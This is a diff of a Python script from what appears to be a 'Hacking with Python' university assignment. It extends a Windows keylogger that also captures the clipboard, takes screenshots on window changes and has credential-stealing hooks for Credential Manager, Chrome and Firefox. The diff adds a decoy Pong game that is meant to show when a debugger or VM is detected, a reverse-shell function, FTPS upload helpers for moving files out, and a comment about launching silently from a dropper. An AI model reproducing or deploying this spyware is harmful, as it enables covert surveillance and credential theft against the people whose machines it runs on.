@@ -9,23 +9,11 @@
 import os
 import socket
 from ctypes import *
-import pythoncom
-import pyWinhook
-import win32clipboard
-import win32gui
-import win32ui
-import win32con
-import win32api
-import pyaes
-import impacket
-import win32cred
-import pywintypes
-import win32cred
-import sqlite3
-import shutil
-import win32crypt
-import win32process
+import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32api, pyaes, win32cred, pywintypes
+import sqlite3, shutil, win32crypt, win32process, sys, random, pygame
 from sys import gettrace as sys_gettrace
+from tkinter import *
+from ftplib import FTP_TLS
 
 #Variables
 user32 = windll.user32
@@ -35,75 +23,180 @@ current_window = None
 current_hwnd = 0
 screenshot_path = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\"
 screenshot_number = 0
+expression = ""
 
 #Functions
+#------------------------Normal/Fake Function (Game)------------------------
+#Python program to create a simple GUI game using Pygame
+def BALL_animation():
+    global BALL_VEL_X, BALL_VEL_Y
+    BALL.x += BALL_VEL_X
+    BALL.y += BALL_VEL_Y
+    #ballbouncing
+    if BALL.top <= 0 or BALL.bottom >= HEIGHT:
+        BALL_VEL_Y *= -1
+    
+    if BALL.left <= 0 or BALL.right >= WIDTH:
+        BALL_restart()
+        
+    if BALL.colliderect(PLAYER) or BALL.colliderect(OPPONENT):
+        BALL_VEL_X *= -1
+    
+        
+def PLAYER_animation():
+    PLAYER.y += PLAYER_VEL
+    if PLAYER.top <= 0:
+        PLAYER.top = 0
+    if PLAYER.bottom >= HEIGHT:
+        PLAYER.bottom = HEIGHT
+
+def OPPONENT_animation():
+    if OPPONENT.top + 20 < BALL.y:
+        OPPONENT.top += OPPONENT_VEL
+    if OPPONENT.bottom - 20 >= BALL.y:
+        OPPONENT.bottom -= OPPONENT_VEL
+    if OPPONENT.top <= 0:
+        OPPONENT.top = 0
+    if OPPONENT.bottom >= HEIGHT:
+        OPPONENT.bottom = HEIGHT
+        
+def BALL_restart():
+    global BALL_VEL_Y, BALL_VEL_X
+    BALL.center = (WIDTH/2, HEIGHT/2)
+    BALL_VEL_Y *= random.choice((1,-1))
+    BALL_VEL_X *= random.choice((1,-1))
+
+#general setup
+pygame.init()
+clock = pygame.time.Clock()
+
+WIDTH, HEIGHT = 1280, 960
+WIN = pygame.display.set_mode((WIDTH, HEIGHT))  #screen width/height
+pygame.display.set_caption("Pong")    #header
+FPS = 60
+
+
+#game ractangles
+BALL = pygame.Rect(WIDTH/2 - 15, HEIGHT/2 - 15, 30,30)
+PLAYER = pygame.Rect(WIDTH - 20, HEIGHT/2 - 70,10,140)
+OPPONENT = pygame.Rect(10, HEIGHT/2 - 70,10,140)
+
+#background
+BG = pygame.Color("grey12")
+GREY = (200,200,200)
+
+BALL_VEL_X = 7
+BALL_VEL_Y = 7
+PLAYER_VEL = 0
+OPPONENT_VEL = 7
+
+#simple pong game if debugger is detected
+def game():
+    while True:
+        #handling input, checks if the close button got clicked!
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                pygame.quit()
+                sys.exit()
+            
+            if event.type == pygame.KEYDOWN:
+                if event.key == pygame.K_DOWN:
+                    PLAYER_VEL = 7
+                if event.key == pygame.K_UP:
+                    PLAYER_VEL = -7
+            
+            if event.type == pygame.KEYUP:
+                if event.key == pygame.K_DOWN:
+                    PLAYER_VEL = 0
+                if event.key == pygame.K_UP:
+                    PLAYER_VEL = 0
+                    
+        BALL_animation()
+        PLAYER_animation()
+        OPPONENT_animation()
+        
+        #visuals
+        WIN.fill(BG)
+        pygame.draw.rect(WIN, GREY, PLAYER)
+        pygame.draw.rect(WIN, GREY, OPPONENT)
+        pygame.draw.ellipse(WIN, GREY, BALL)
+        pygame.draw.aaline(WIN,GREY,(WIDTH/2,0), (WIDTH/2, HEIGHT))
+        
+        #updating the window
+        pygame.display.flip()
+        clock.tick(FPS)
+#------------------------END Normal/Fake Function (Game)------------------------
+
 
 #------------------------Keylogger and Screenshotter------------------------
 def get_current_process():
-    # get a handle to the foreground window
+    #get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
-    # find the process ID
+    #find the process ID
     pid = c_ulong(0)
     user32.GetWindowThreadProcessId(hwnd, byref(pid))
-    # store the current process ID
+    #store the current process ID
     process_id = "\%d" % pid.value
-    # grab the executable
+    #grab the executable
     executable = create_string_buffer(b"\x00" * 512)
     h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
     psapi.GetModuleBaseNameA(h_process ,None ,byref(executable), 512)
-    # now read its title
+    #now read its title
     window_title = create_string_buffer(b"\x00" * 512)
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
-    # print out the header if we 're in the right process
+    #print out the header if we 're in the right process
     processinfo = "\n[ PID: \%s - \%s - \%s ]" % (process_id , executable.value, window_title.value) +"\n"
     print(processinfo)
     WriteToFile(processinfo)
-    # close handles
+    #close handles
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
-    # create and register a hook manager
+    #create and register a hook manager
     kl = pyWinhook.HookManager()
     kl.KeyDown = KeyStroke
-    # register the hook and execute forever
+    #register the hook and execute forever
     kl.HookKeyboard()
     pythoncom.PumpMessages()
 
 def WriteToFile(s):
-     # save keystrokes to a file
+     #save keystrokes to a file
     if not os.path.exists(str(get_path()) + "keystrokes"):
         os.makedirs(str(get_path()) + "keystrokes")
         open(str(get_path()) + "/keystrokes/test.txt", "w")
-    # Modus a + fuers updaten der datei
+    #Modus a + fuers updaten der datei
     file = open(str(get_path()) + '/keystrokes/test.txt', 'a+') 
-    file.write(s)
+    if s == "[Space]":
+        file.write(" ")
+    else:
+        file.write(s)
     file.close()
 
 def WritePasswordToFile(s):
-    # save keystrokes to a file
+    #save keystrokes to a file
     if not os.path.exists(str(get_path()) + "keystrokes"):
         os.makedirs(str(get_path()) + "keystrokes")
         open(str(get_path()) + "/keystrokes/enc_dec.txt", "w")
-    # Modus a + fuers updaten der datei
+    #Modus a + fuers updaten der datei
     file = open(str(get_path()) + '/keystrokes/enc_dec.txt', 'a+') 
     file.write(s)
     file.close()
 
 def KeyStroke(event) :
     global current_window
-    # check to see if target changed windows
+    #check to see if target changed windows
     if event.WindowName != current_window :
         current_window = event.WindowName
         global screenshot_number
         screenshot_number += 1
         SaveScreenshot("program" + str(screenshot_number) + ".png")
         get_current_process()
-    # if they pressed a standard key
+    #if they pressed a standard key
     if 32 < event.Ascii < 127:
         c = chr(event.Ascii)
         print(c)
         WriteToFile(c)
     else :
-    # if [ Ctrl - V ] , get the value on the clipboard
+    #if [ Ctrl - V ] , get the value on the clipboard
         if event.Key == "V":
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
@@ -115,34 +208,34 @@ def KeyStroke(event) :
             k = "[%s]" % event.Key
             print(k)
             WriteToFile(k)
-    # pass execution to next hook registered
+    #pass execution to next hook registered
     return True
 
 
 def SaveScreenshot(filename):
-    # grab a handle to the main desktop window
+    #grab a handle to the main desktop window
     hdesktop = win32gui.GetDesktopWindow()
-    # determine the size of all monitors in pixels
+    #determine the size of all monitors in pixels
     width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
     height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
     left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
     top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
-    # create a device context
+    #create a device context
     desktop_dc = win32gui.GetWindowDC(hdesktop)
     img_dc = win32ui.CreateDCFromHandle(desktop_dc)
-    # create a memory based device context
+    #create a memory based device context
     mem_dc = img_dc.CreateCompatibleDC()
-    # create a bitmap object
+    #create a bitmap object
     screenshot = win32ui.CreateBitmap()
     screenshot.CreateCompatibleBitmap(img_dc, width, height)
     mem_dc.SelectObject(screenshot)
-    # copy the screen into our memory device context
+    #copy the screen into our memory device context
     mem_dc.BitBlt((0 , 0), (width, height), img_dc, (left ,top), win32con.SRCCOPY)
-    # save the bitmap to a file
+    #save the bitmap to a file
     if not os.path.exists(str(get_path()) + "screenshots"):
         os.makedirs(str(get_path()) + "screenshots")
     screenshot.SaveBitmapFile(mem_dc, str(get_path()) + "/screenshots/" + filename)
-    # free our objects
+    #free our objects
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
     #number += 1
@@ -258,7 +351,7 @@ def get_firefox_passwords(quiet=0):
 
 #------------------------Detect Debuggers------------------------
 def is_debugger_present():
-    if win32process.IsDebugged():
+    if __debug__ == True or sys.gettrace() != None:
         return True
     else:
         return False
@@ -266,9 +359,57 @@ def is_debugger_present():
 __debug__ #true if started with python -d, else wrong
 #------------------------END Detect Debuggers------------------------
 
+#------------------------Start detection of VM------------------------
+def is_vm():
+    try:
+        if os.path.exists("C:\\Windows\\system32\\vmcheck.dll") or hasattr(sys, "getwindowsversion"):
+            return True
+        else:
+            return False
+    except:
+        return False
+#------------------------END detection of VM------------------------
+
+#------------------------Reverse Shell Function------------------------
+def reverse_shell(s):
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    os.pty.spawn("/bin/bash")
+
+#------------------------END Reverse Shell Function------------------------
+
+#------------------------Connection to FTPS server------------------------
+def ftps_connect(ipv6):
+    ftps = FTP_TLS()
+    ftps.connect("127.0.0.1")
+    ftps.login("anonymous", "anonymous")
+    ftps.prot_p()
+    if ipv6 == True:
+        ftps.af = socket.AF_INET6
+    ftps.retrlines('LIST')
+    return ftps
+
+def ftps_upload_file(ftps, file):
+    ftps.storbinary('STOR ' + file, open(file, 'rb'))
+
+def ftps_download_file(ftps, file):
+    ftps.retrbinary('RETR ' + file, open(file, 'wb').write)
+
+def ftps_create_dir(ftps, dir):
+    ftps.mkd(os.environ.get("USERNAME"))
+    ftps.cwd(os.environ.get("USERNAME"))
+#------------------------END Connection to FTPS server------------------------
 
 #Test all of the above functions:
 def main():
+    #debugger and vm detection, if detected open the game, otherwise the keylogger
+    #if is_debugger_present() == True or is_vm() == True:
+    #    print("Debugger detected!")
+    #    game()
+    #    sys.exit()
+
+
     #just works like this, use it wisely, produces a picture of all the current connected monitors of the laptop!
     #SaveScreenshot("test.png")
     
@@ -282,10 +423,6 @@ def main():
     #get_credman_passwords()
     #get_chrome_passwords()
     #get_firefox_passwords()
-
-    #debugger detection
-    #if is_debugger_present() == True or __debug__ == True or sys.gettrace() != None:
-    #    print("Debugger detected!")
     pass
    #############to run this keylogger silently, meaning without a shown console, one would have to start it with pythonw <script.py>
    #############this is meant to run a script with a GUI. meaning the keylogger will be run silently in the background... (Start from Dropper software)
